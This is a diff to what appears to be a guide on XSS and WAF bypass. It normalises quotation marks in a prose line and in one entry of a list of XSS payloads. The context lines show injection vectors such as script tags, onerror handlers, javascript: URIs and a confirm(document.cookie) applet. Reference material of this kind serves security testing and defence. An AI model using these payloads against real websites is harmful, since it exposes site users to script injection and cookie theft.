@@ -1014,7 +1014,7 @@ Here are all the possible combinations of the character `\<` in HTML and JavaScr
 
 #### Stored XSS
 
-If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.
+If an attacker managed to push XSS through the filter, WAF wouldn't be able to prevent the attack conduction.
 
 #### Reflected XSS in JavaScript
 
@@ -1082,7 +1082,7 @@ This request will pass through the WAF and an XSS attack will be conducted in ce
 - `<Input value = "XSS" type = text>`
 - `<applet code="javascript:confirm(document.cookie);">`
 - `<isindex x="javascript:" onmouseover="alert(XSS)">`
-- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
+- `"></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
 - `"><img src="x:x" onerror="alert(XSS)">`
 - `"><iframe src="javascript:alert(XSS)">`
 - `<object data="javascript:alert(XSS)">`
